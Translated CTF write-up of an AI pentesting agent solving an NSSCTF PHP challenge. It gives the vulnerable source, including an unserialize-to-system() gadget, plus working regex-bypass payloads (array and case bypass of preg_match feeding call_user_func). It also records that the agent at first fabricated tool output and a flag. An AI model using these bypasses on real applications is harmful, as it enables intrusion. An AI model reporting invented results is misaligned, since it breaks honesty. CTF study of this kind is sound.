# 🦞 War Story #001 — NSSCTF PHP Regex bypass + call_user_func

## Metadata

| Field | Value |
|------|------|
| **Date** | 2026-04-19 |
| **Objective** | `http://node5.anna.nssctf.cn:23284/` |
| **Question type** | Web — PHP Regex bypass + call_user_func Array callback |
| **Keywords** | PHP、Regex bypass、Deserialization、call_user_func、Array bypass |
| **BugHunter Rounds** | 12 |
| **MCP Tool** | fetch |
| **Correct Flag** | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` |

---

## Attack chain (complete real process)

| Steps | Operation | Discovery |
|------|------|------|
| 1 | GET Request homepage | Apache/2.4.54 + PHP/7.4.30, find `js/1.js` and `css/1.css` |
| 2 | View `js/1.js` | JS Found in comments Base64 String `NSSCTF{TnNTY1RmLnBocA==}` |
| 3 | Base64 Decode | Obtain `NsScTf.php` — Hidden PHP File |
| 4 | GET Request `NsScTf.php` | Obtain Source Code:NSSCTF Deserialize Class + `call_user_func` Path |
| 5 | Analyze Regex | `preg_match("/n|c/m", ...)` None `i` Modifiers → Case insensitive bypass |
| 6 | Try `p=Nss::ctf`(Case bypass) | Return "no" — Nss Class does not exist, need to find the correct class name |
| 7 | Access `hint2.php` | Tip:**"Is there a possibility that the class isnss2"** |
| 8 | Try `p=Nss2::Ctf` | Return "no" — `Nss2` Lowercase in `s` Does not affect but may `::` There is a problem with processing |
| 9 | Analysis `call_user_func` Semantics | `call_user_func` Support for array callbacks `['Class name', 'Method name']` |
| 10 | Construct array bypass payload | `p[]=nss2&p[]=ctf` → Array bypass `preg_match`, Callback Invocation `nss2::ctf()` |
| 11 | Send `GET /NsScTf.php?p[]=nss2&p[]=ctf` | ✅ Success! The response contains `<?php $flag="NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}";?>` |
| 12 | Flag Verification confirmation | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` ✅ |

---

## Source code analysis

### Entry file homepage

```php
<?php
header('Content-type: text/html; charset=utf-8');
error_reporting(0);
highlight_file(__FILE__);

class NSSCTF{
    public $cmd;
    public $name;

    function __destruct(){
        if(strlen($this->cmd) > 1 && strlen($this->cmd) < 100){
            if(stripos($this->cmd, 'n') !== false || stripos($this->cmd, 'c') !== false){
                if (preg_match_all('/n|c/', $this->cmd, $matches)){
                    system($this->cmd);
                }
            }
        }
    }
}

@unserialize($_GET['nss']);
?>
```

**Analysis**: `NSSCTF` The deserialization path of the class exists but `stripos` Case Insensitive + `preg_match_all` Case-sensitive combined conditions cause RCE Extremely difficult to trigger.**The real vulnerability point is not here**.

### Core Vulnerability Code (NsScTf.php Scroll to the bottom)

```php
//hint: WithgetWhat is another similar request protocol?
include("flag.php");
class nss {
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m", $_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```

### hint2.php

```
Is there a possibility that the class isnss2
```

### Genuine flag Read class

```php
class nss2 {
    static function ctf(){
        include("flag.php");
        echo $flag;
    }
}
```

---

## Correct Payload And principles

### Payload 1: Array bypass (final successful solution)

```
GET /NsScTf.php?p[]=nss2&p[]=ctf
```

**Principle**:
1. `?p[]=nss2&p[]=ctf` Make `$_GET['p']` Turn into an array `['nss2', 'ctf']`
2. `preg_match("/n|c/m", array, ...)` The second parameter needs to be a string, returning input array `false` → **Bypass regex**
3. `call_user_func(['nss2', 'ctf'])` — Array callback equivalent to `nss2::ctf()` → Contain `flag.php` And output

### Payload 2: Case bypass (theoretically feasible)

```
GET /NsScTf.php?p=Nss2::Ctf
```

**Principle**:
- Regular Expression `/n|c/m` None `i` Modifiers, match only lowercase `n` and `c`
- `Nss2::Ctf` In `N` and `C` Is uppercase, not matched by regex → Bypass
- PHP Class names and method names are case insensitive,`Nss2::Ctf` Equivalent to `nss2::ctf()`

> ⚠️ Case bypass intercepted in practice (Round 7 Return "no"), possibly due to PHP 's `call_user_func` To `Nss2::Ctf` The parsing method of the string is different, or there are other filters.**Array bypass is more reliable**.

---

## BugHunter Illusion issue fix record

At first run (#001 Initial version),BugHunter Exposed severe hallucination issues:

| Hallucination type | Performance | Root cause | Fix |
|----------|------|------|------|
| Fake tool returns | fetch Returned an impossible flag | LLM In think Deriving and fabricating results after | prompts.py Add rules against hallucinations |
| Parameter misunderstanding | `call_user_func('readfile')` Can read files without parameters | Do not understand call_user_func Semantics | Core contract add parameter rules |
| Completed without verification | Get flag Direct [DONE] | No validation mechanism | core.py Add flag Verification tracking |
| Lack of regex knowledge | Do not know case sensitivity and array bypass | Missing. PHP Regex bypass knowledge | prompts.py + Skill Reference document supplement |

**Code Improvement**:
- `prompts.py` Newly added"Illusions are strictly prohibited"Rule + Flag Validate mandatory steps + PHP Regex bypass system knowledge
- `core.py` Newly added `_detect_flag_claim()` flag Verification tracking + Autonomous Loop Enforced Validation
- `web-playbook-24-php-regex-bypass.md` Newly added PHP Regular expression bypass special reference document

---

## Experience summary

### Core methodology

1. **First analyze the regex modifiers**: Presence or Absence `i`(case insensitive)、`m`(multi-line)、`s`(Dot matching newline) directly determines the bypass method
2. **Case sensitivity bypass is the most common regex bypass**: When Regex is not available `i` Modifiers, whenPHP Function name/Class name case insensitive
3. **Array bypass is a universal bypass**: `preg_match` Incoming array return `false`Applicable to almost all based on. `preg_match` Filtering
4. **call_user_func Support for array callbacks**: `['Class name', 'Method name']` Equivalent to `Class name::Method name()`
5. **Don’t stubbornly stick to one path**: Deserialize path `stripos` Difficult to Bypass → Change `call_user_func` Path → Array bypass

### BugHunter Capability verification

| Capability | Performance | Scoring |
|------|------|------|
| Target reconnaissance | Automatic discovery JS In Base64 Clue | ⭐⭐⭐⭐ |
| Source code analysis | Correctly analyze regular expressions and call_user_func Logic | ⭐⭐⭐⭐ |
| Bypass construction | Bypass through case sensitivity → Array Bypass, Step Closer | ⭐⭐⭐ |
| Flag verification | Force verification after fixing, confirm flag Real | ⭐⭐⭐⭐ |
| Illusion control | No illusions after fixing, the tool returns real data | ⭐⭐⭐⭐ |

---

*BugHunter First battle · 2026-04-19 · 12 Autonomous penetration round · Array bypass success flag capture · The illusion problem has been fixed 🦞*
